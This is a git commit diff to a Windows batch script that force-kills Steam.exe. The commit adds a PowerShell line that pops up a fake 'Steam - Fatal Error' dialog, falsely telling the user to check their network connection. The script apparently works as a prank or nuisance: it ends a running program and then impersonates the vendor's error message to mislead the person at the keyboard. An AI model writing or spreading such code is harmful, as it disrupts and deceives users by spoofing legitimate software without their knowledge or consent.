669b71e89eec888361ad2518396eabbb3edb561d
ytufghfhdw554 <madlyx.alt@gmail.com>
2025-10-04 17:33:13 +0300

    Update fucked.bat

--- fucked.bat
+++ fucked.bat
@@ -1,3 +1,5 @@
 @echo off
 taskkill /IM Steam.exe /F
+powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Steam needs to be online to update. Please confirm your network connection and try again.','Steam - Fatal Error',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Error)"
+
 
